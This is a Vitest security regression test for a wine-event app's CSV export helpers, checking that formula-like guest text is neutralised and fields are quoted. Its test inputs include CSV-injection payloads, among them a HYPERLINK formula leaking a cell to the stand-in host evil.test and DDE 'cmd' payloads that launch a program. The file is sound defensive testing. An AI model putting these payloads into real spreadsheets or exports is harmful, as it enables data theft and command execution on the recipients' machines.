/**
 * Security regression (pre-launch audit, M5): guest-controlled text in the
 * winemaker CSV exports must never be evaluated as a spreadsheet formula.
 */
import { describe, it, expect } from 'vitest';
import { escapeCsvField, neutralizeCsvFormula } from '@/lib/utils/csv';

describe('neutralizeCsvFormula', () => {
  it.each([
    '=HYPERLINK("https://evil.test/?d="&A2,"Voir")',
    '=1+1',
    "+cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    '\t=1+1',
    '\r=1+1',
    '  =1+1',
    '+SUM(A1:A9)',
    '-A1',
  ])('prefixes %j with an apostrophe', (value) => {
    expect(neutralizeCsvFormula(value)).toBe(`'${value}`);
  });

  it.each([
    'Jane Doe',
    'jane.doe@example.com',
    'Dégustation Fendant & Petite Arvine',
    'ENC-AB12CD34',
    'Marie-Claire',
    'a=b',
    '',
  ])('leaves ordinary text %j untouched', (value) => {
    expect(neutralizeCsvFormula(value)).toBe(value);
  });

  it.each([
    '+41 27 123 45 67',
    '+41791234567',
    '-12.50',
    '+41 (0)27 123-45-67',
  ])('leaves the harmless numeric/phone value %j untouched', (value) => {
    expect(neutralizeCsvFormula(value)).toBe(value);
  });
});

describe('escapeCsvField', () => {
  it('quotes commas, quotes and line breaks (RFC 4180)', () => {
    expect(escapeCsvField('Doe, John')).toBe('"Doe, John"');
    expect(escapeCsvField('say "hi"')).toBe('"say ""hi"""');
    expect(escapeCsvField('line1\nline2')).toBe('"line1\nline2"');
    expect(escapeCsvField('line1\rline2')).toBe('"line1\rline2"');
  });

  it('neutralizes first, then quotes', () => {
    expect(escapeCsvField('=HYPERLINK("x","y")')).toBe(
      '"\'=HYPERLINK(""x"",""y"")"'
    );
  });

  it('leaves a plain cell bare', () => {
    expect(escapeCsvField('Wine Tasting')).toBe('Wine Tasting');
  });
});
